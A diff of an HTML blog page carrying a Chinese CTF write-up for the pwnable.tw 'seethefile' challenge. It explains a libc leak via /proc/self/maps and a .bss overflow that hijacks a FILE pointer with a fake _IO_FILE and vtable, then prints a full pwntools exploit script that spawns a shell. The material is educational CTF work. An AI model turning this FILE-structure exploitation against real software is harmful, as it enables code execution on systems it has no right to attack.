@@ -1,7 +1,5 @@
-<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>PWNABLE.TW-seethefile-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出"><meta property="og:image" content><meta property="og:title" content="PWNABLE.TW-seethefile-WP"><meta property="og:description" content="首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1253.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-06T14:46:38+00:00"><meta property="article:modified_time" content="2021-04-06T14:46:38+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="PWNABLE.TW-seethefile-WP"><meta name=twitter:description content="首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出"><script src=https://www.cjovi.icu/js/feather.min.js></script>
-<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.bfb8dec0e2220d86f104bd8230dbf2c35b583e46ccfef90bb620854db94ef7a5.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
-<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
-<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>PWNABLE.TW-seethefile-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出"><meta property="og:image" content><meta property="og:title" content="PWNABLE.TW-seethefile-WP"><meta property="og:description" content="首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1253.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-06T14:46:38+00:00"><meta property="article:modified_time" content="2021-04-06T14:46:38+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="PWNABLE.TW-seethefile-WP"><meta name=twitter:description content="首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出"><script src=https://www.cjovi.icu/js/feather.min.js></script><link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
 <a href=/posts.html>All posts</a>
 <a href=/about.html>About</a>
 <a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>PWNABLE.TW-seethefile-WP</h1><div class=meta>Posted on Apr 6, 2021</div></div><section class=body><p>首先是前置的小 trick：<a href=https://www.cjovi.icu/pwnreview/1070.html>关于/proc目录</a></p><p>题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 <code>/proc/self/maps</code> 来 leak 出 libc 的基地址。</p><p>然后在退出时</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/04/1527643670.png></div><p>注意到这里有一个 <code>"%s"</code> 可以溢出。一开始也没仔细看，以为 name 是栈上的变量，也没看到后面的 <code>exit(0)</code>，准备 rop，结果发现 name 在 .bss 段上，难以 rop，但是注意到 fp 变量在 name 后面，所以可以通过溢出覆写 fp。程序没有开启 PIE，所以我们写入的地址是已知的，我们布置好一个 fake_file，让 fp 指向它，在执行 fclose 的时候 getshell 了。</p><p>说来惭愧，但现在我对 _IO_FILE 的了解还是只浮于表面，所以这里我没法分析的太深。原理和伪造方式可以看<a href=https://www.jianshu.com/p/a6354fa4dbdf>这位博主的总结</a>（文章也贴心地给出了各种情况下 fake_file 的模板）。以本题为例，就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#_flags &amp; 0x2000不为0最终会调用fp-&gt;vtabl-&gt;__fclose(fp)
@@ -11,55 +9,55 @@
 </span></span><span style=display:flex><span>fake_file = fake_file.ljust(0x94, &#34;\x00&#34;)
 </span></span><span style=display:flex><span>fake_file += p32(fake_vtable)#fake vtable address = buf_addr + 0x98 - 0x44
 </span></span><span style=display:flex><span>fake_file += p32(system)
-</span></span></code></pre></div><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
-</span></span><span style=display:flex><span># coding=utf-8
-</span></span><span style=display:flex><span>from pwn import *
+</span></span></code></pre></div><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>#sh = process(&#34;./seethefile&#34;)
-</span></span><span style=display:flex><span>sh = remote(&#34;chall.pwnable.tw&#34;,10200)
-</span></span><span style=display:flex><span>libc = ELF(&#34;./libc_32.so.6&#34;)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./seethefile&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;chall.pwnable.tw&#34;</span>,<span style=color:#40a070>10200</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc_32.so.6&#34;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,str(1))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;to see :&#34;,&#39;/proc/self/maps&#39;)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;to see :&#34;</span>,<span style=color:#4070a0>&#39;/proc/self/maps&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,str(2))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,str(3))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>2</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>3</span>))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,str(2))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,str(3))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>2</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>3</span>))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.recvuntil(&#34;0&#34;)
-</span></span><span style=display:flex><span>sh.recvuntil(&#39;\n&#39;)
-</span></span><span style=display:flex><span>libc_base = int(sh.recvuntil(&#39;-&#39;,drop = True),base = 16)
-</span></span><span style=display:flex><span>log.success(&#34;libc_base:&#34; + hex(libc_base))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;0&#34;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;-&#39;</span>,drop <span style=color:#666>=</span> True),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> hex(libc_base))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>system_addr = libc_base + libc.sym[&#34;system&#34;]
-</span></span><span style=display:flex><span>bin_sh_addr = libc_base + libc.search(&#34;/bin/sh&#34;).next()
-</span></span><span style=display:flex><span>one_gadget = libc_base + 0x3a819
+</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
+</span></span><span style=display:flex><span>bin_sh_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>search(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>)<span style=color:#666>.</span>next()
+</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x3a819</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,str(5))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>5</span>))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload = &#39;a&#39; * 0x20 + p32(0x804B300)
-</span></span><span style=display:flex><span>payload = payload.ljust(0x804B300 - 0x804B260,&#39;\x00&#39;)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> p32(<span style=color:#40a070>0x804B300</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x804B300</span> <span style=color:#666>-</span> <span style=color:#40a070>0x804B260</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>buf_addr = 0x804B300
+</span></span><span style=display:flex><span>buf_addr <span style=color:#666>=</span> <span style=color:#40a070>0x804B300</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>fake_vtable = 0x804B300 + 0x98 - 0x44
-</span></span><span style=display:flex><span>fake_lock_addr = 0x804B308
-</span></span><span style=display:flex><span>fake_file = &#34;/bin/sh\x00&#34;
-</span></span><span style=display:flex><span>fake_file = fake_file.ljust(0x48,&#39;\x00&#39;)
-</span></span><span style=display:flex><span>fake_file += p32(fake_lock_addr) # 指向一处值为0的地址
-</span></span><span style=display:flex><span>fake_file = fake_file.ljust(0x94, &#34;\x00&#34;)
-</span></span><span style=display:flex><span>fake_file += p32(fake_vtable)#fake vtable address = buf_addr + 0x98 - 0x44
-</span></span><span style=display:flex><span>fake_file += p32(system_addr)
+</span></span><span style=display:flex><span>fake_vtable <span style=color:#666>=</span> <span style=color:#40a070>0x804B300</span> <span style=color:#666>+</span> <span style=color:#40a070>0x98</span> <span style=color:#666>-</span> <span style=color:#40a070>0x44</span>
+</span></span><span style=display:flex><span>fake_lock_addr <span style=color:#666>=</span> <span style=color:#40a070>0x804B308</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> <span style=color:#4070a0>&#34;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> fake_file<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x48</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p32(fake_lock_addr) <span style=color:#60a0b0;font-style:italic># 指向一处值为0的地址</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> fake_file<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x94</span>, <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>)
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p32(fake_vtable)<span style=color:#60a0b0;font-style:italic>#fake vtable address = buf_addr + 0x98 - 0x44</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p32(system_addr)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload += fake_file
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> fake_file
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;name :&#34;,payload)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;name :&#34;</span>,payload)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.interactive()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
 </span></span></code></pre></div><h3 id=getshell-之后>getshell 之后&mldr;</h3><p>拿到 shell 后会发现无法直接 cat flag，但是提供了一个 get_flag 的程序及其源码，看一下源码</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/04/2085184232.png></div><p>所以运行程序输入 <code>Give me the flag</code> 就可以获得 flag 了。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
 <a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
 <a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
 <a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
-<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
+<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2024  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
